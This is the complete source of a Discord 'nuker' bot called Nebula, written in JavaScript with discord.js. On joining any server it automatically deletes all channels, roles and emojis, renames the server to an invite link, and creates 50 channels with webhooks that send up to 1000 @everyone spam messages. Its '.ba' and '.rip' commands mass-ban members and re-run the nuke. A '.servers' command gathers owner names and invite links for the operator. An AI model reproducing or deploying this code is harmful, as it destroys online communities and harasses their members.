const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers via webhooks...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) {
      console.log('ℹ️ Cannot leave: Already left or guild unavailable');
      return;
    }
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Successfully left the server.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked from server.');
    } else {
      console.error(`⚠️ Error leaving server:`, err.message);
    }
  }
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

// ====== AUTO-NUKE ON JOIN (USING WEBHOOKS) ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const webhookName = 'neb-was-here';

  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
    await safeLeaveGuild(guild);
    return;
  }

  console.log(`🎯 Auto-nuking server: ${guild.name} (${guild.id})`);

  let didSomething = false;
  let sent = 0;

  try {
    // Wait a bit after join
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Step 1: Delete channels
    console.log('🧹 Deleting channels...');
    await Promise.all(guild.channels.cache.map(async (channel) => {
      const result = await handleRateLimit(() =>
        channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted channel: ${channel.name}`);
        didSomething = true;
      }
    }));

    // Step 2: Delete roles
    console.log('🛡️ Deleting roles...');
    await Promise.all(guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(async (role) => {
      const result = await handleRateLimit(() =>
        role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted role: ${role.name}`);
        didSomething = true;
      }
    }));

    // Step 3: Delete emojis
    console.log('🖼️ Deleting emojis...');
    await Promise.all(guild.emojis.cache.map(async (emoji) => {
      const result = await handleRateLimit(() =>
        emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
      );
      if (result) {
        console.log(`🗑️ Deleted emoji: ${emoji.name}`);
        didSomething = true;
      }
    }));

    // Step 4: Rename server
    console.log('📛 Renaming server...');
    await handleRateLimit(() =>
      guild.setName('discord.gg/migh').catch(e => console.warn(`Rename fail: ${e.message}`))
    );
    console.log('✅ Server renamed.');
    didSomething = true;

    // Step 5: Create 50 channels
    const createdChannels = [];
    const totalChannelsToCreate = 50;

    console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
    for (let i = 0; i < totalChannelsToCreate; i++) {
      const channel = await handleRateLimit(() =>
        guild.channels.create({ name: `neb-was-here-${i + 1}` })
          .catch(e => console.warn(`Channel #${i + 1} failed:`, e.message))
      );
      if (channel) {
        console.log(`✅ Created channel: ${channel.name}`);
        createdChannels.push(channel);
        didSomething = true;
      }
    }

    if (createdChannels.length === 0) {
      console.error('❌ No channels created. Aborting.');
      await safeLeaveGuild(guild);
      return;
    }

    // Step 6: Create WEBHOOKS in each channel
    const webhooks = [];
    console.log('🔧 Creating webhooks...');
    for (const channel of createdChannels) {
      const wh = await handleRateLimit(() =>
        channel.createWebhook({ name: webhookName })
          .catch(e => console.warn(`Webhook create failed in ${channel.name}:`, e.message))
      );
      if (wh) {
        webhooks.push(wh);
        console.log(`🔗 Webhook created in ${channel.name}`);
      }
    }

    if (webhooks.length === 0) {
      console.error('❌ No webhooks created. Falling back to direct send...');
      // Fallback to normal send
      for (const channel of createdChannels) {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          await handleRateLimit(() => channel.send(spamMessage));
          sent++;
        }
      }
    } else {
      // Step 7: SPAM via WEBHOOKS (FAST)
      console.log(`🔥 Spamming via ${webhooks.length} webhooks...`);
      const MAX_MESSAGES = 1000;
      const MESSAGES_PER_WEBHOOK = 20;

      const spamPromises = [];

      for (const webhook of webhooks) {
        for (let i = 0; i < MESSAGES_PER_WEBHOOK && sent < MAX_MESSAGES; i++) {
          spamPromises.push(
            handleRateLimit(() => webhook.send({ content: spamMessage }))
              .then(() => sent++)
              .catch(() => {})
          );
        }
      }

      // Fire all at once
      await Promise.allSettled(spamPromises);
      console.log(`✅ Sent ${sent} messages via webhooks.`);
    }

    // Leave if successful
    if (sent >= 950) await safeLeaveGuild(guild);

    if (didSomething) {
      console.log('✅ Auto-nuke complete.');
    }
  } catch (err) {
    console.error('🚨 Critical error during auto-nuke:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MESSAGE HANDLER (.ba, .help, .servers) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Here are the available commands for Nebula Bot:')
      .addFields(
        { name: '.rip', value: 'Nukes the server using webhooks for fast spam' },
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly - only in servers you own!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Sent help to your DMs!');
    } catch (err) {
      console.error('❌ Could not send DM:', err.message);
      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
    }
    return;
  }

  // ===== SERVERS COMMAND (Owner Only) =====
  if (command === 'servers') {
    if (message.author.id !== '1400281740978815118') {
      return message.reply('❌ You are not authorized to use this command.');
    }

    const guilds = client.guilds.cache;
    const serverList = [];

    console.log(`📥 ${message.author.tag} requested .servers`);
    await message.reply('📬 Fetching server list...');

    for (const [id, guild] of guilds.entries()) {
      try {
        const invites = await handleRateLimit(() => guild.invites.fetch());
        const firstInvite = invites?.first() || null;
        const owner = await handleRateLimit(() => guild.fetchOwner());
        serverList.push({
          name: guild.name,
          id: guild.id,
          ownerTag: owner.user.tag,
          invite: firstInvite ? firstInvite.url : 'No active invite found',
        });
      } catch (err) {
        console.error(`❌ Could not fetch data for guild ${guild.name}:`, err.message);
        serverList.push({
          name: guild.name,
          id: guild.id,
          error: 'Could not retrieve details (permissions?)',
        });
      }
    }

    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers I\'m In')
      .setDescription(`Total: ${serverList.length}`)
      .setColor('#00ffff');

    for (let i = 0; i < Math.min(serverList.length, 25); i++) {
      const server = serverList[i];
      const value = server.error
        ? `ID: ${server.id}\n⚠️ ${server.error}`
        : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
      embed.addFields({ name: `${i + 1}. ${server.name}`, value });
    }

    try {
      await message.author.send({ embeds: [embed] });
      if (serverList.length > 25) {
        for (let i = 25; i < serverList.length; i += 25) {
          const page = serverList.slice(i, i + 25);
          const moreEmbed = new EmbedBuilder()
            .setColor('#00ffff')
            .setTitle(`🌐 Servers I'm In (Page ${Math.floor(i / 25) + 1})`);
          for (const server of page) {
            const value = server.error
              ? `ID: ${server.id}\n⚠️ ${server.error}`
              : `Owner: ${server.ownerTag}\nID: ${server.id}\n🔗 Invite: [Click here](${server.invite})`;
            moreEmbed.addFields({ name: `${serverList.indexOf(server) + 1}. ${server.name}`, value });
          }
          await message.author.send({ embeds: [moreEmbed] });
        }
      }
      await message.reply('✅ Server list sent to your DMs!');
    } catch (err) {
      console.error('❌ Failed to send DM:', err.message);
      await message.reply('❌ Could not send DM. Make sure your DMs are open.');
    }
    return;
  }

  // Block .ba and .rip in blocked server
  if ((command === 'ba' || command === 'rip') && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 This command is disabled in this server.');
  }

  // ===== BAN ALL COMMAND =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BAN_MEMBERS')) {
      return message.reply("❌ You don't have permission to ban members.");
    }

    const guild = message.guild;
    const ownerID = guild.ownerId;

    try {
      await message.channel.send("🔍 Fetching all members...");
      const allMembers = await guild.members.fetch();
      console.log(`📥 Fetched ${allMembers.size} members.`);

      const membersToBan = allMembers.filter(member =>
        member.id !== ownerID &&
        !member.user.bot &&
        member.bannable
      );

      if (membersToBan.size === 0) {
        return message.reply('❌ No members available to ban.');
      }

      console.log(`🔪 Attempting to ban ${membersToBan.size} members...`);
      await message.reply(`🔪 Attempting to ban ${membersToBan.size} members...`);

      let bannedCount = 0;
      let failCount = 0;

      for (const member of membersToBan.values()) {
        try {
          const result = await handleRateLimit(() => guild.members.ban(member, {
            reason: 'Nebula Ban All',
            deleteMessageSeconds: 604800
          }));
          if (result !== null) {
            console.log(`✅ Banned: ${member.user.tag}`);
            bannedCount++;
          } else {
            failCount++;
          }
        } catch (err) {
          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
          failCount++;
        }
        await new Promise(r => setTimeout(r, 50));
      }

      console.log(`✅ Ban process finished. Banned: ${bannedCount}, Failed: ${failCount}`);
      await message.reply(`✅ Ban process finished. Successfully banned: ${bannedCount}. Failed: ${failCount}.`);
    } catch (fetchErr) {
      console.error(`❌ Error fetching members: ${fetchErr.message}`);
      await message.reply(`❌ Error occurred while fetching members: ${fetchErr.message}`);
    }
  }

  // ===== RIP COMMAND (Manual, Webhook Version) =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    let didSomething = false;
    let sent = 0;

    try {
      console.log(`🎯 Manually nuking: ${guild.name}`);

      // Delete channels, roles, emojis, rename
      await Promise.allSettled([
        // Channels
        (async () => {
          await Promise.allSettled(guild.channels.cache.map(ch =>
            handleRateLimit(() => ch.delete().catch(() => {}))
          ));
          console.log('🧹 Channels deleted');
        })(),

        // Roles
        (async () => {
          await Promise.allSettled(guild.roles.cache
            .filter(r => r.name !== '@everyone' && !r.managed)
            .map(r => handleRateLimit(() => r.delete().catch(() => {})))
          );
          console.log('🛡️ Roles deleted');
        })(),

        // Emojis
        (async () => {
          await Promise.allSettled(guild.emojis.cache.map(e =>
            handleRateLimit(() => e.delete().catch(() => {}))
          ));
          console.log('🖼️ Emojis deleted');
        })(),

        // Rename
        (async () => {
          await handleRateLimit(() => guild.setName('discord.gg/migh').catch(() => {}));
          console.log('📛 Server renamed');
        })()
      ]);

      // Create 50 channels
      const createdChannels = [];
      for (let i = 0; i < 50; i++) {
        const ch = await handleRateLimit(() =>
          guild.channels.create({ name: `neb-was-here-${i + 1}` })
        );
        if (ch) createdChannels.push(ch);
      }

      if (createdChannels.length === 0) {
        await message.reply('❌ Could not create channels.');
        return;
      }

      // Create webhooks
      const webhooks = [];
      for (const ch of createdChannels) {
        const wh = await handleRateLimit(() =>
          ch.createWebhook({ name: 'neb-was-here' }).catch(() => null)
        );
        if (wh) webhooks.push(wh);
      }

      // Spam via webhooks
      const MAX = 1000;
      const promises = [];
      for (const wh of webhooks) {
        for (let i = 0; i < 20 && sent < MAX; i++) {
          promises.push(
            handleRateLimit(() => wh.send({ content: spamMessage }))
              .then(() => sent++)
              .catch(() => {})
          );
        }
      }

      await Promise.allSettled(promises);
      console.log(`✅ Sent ${sent} webhook messages.`);

      if (sent >= 950) await safeLeaveGuild(guild);

      await message.reply(`✅ Nuked. Sent ${sent} messages via webhooks.`);
    } catch (err) {
      console.error('🚨 Error in .rip:', err.message);
      await message.reply('❌ Failed to nuke server.');
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
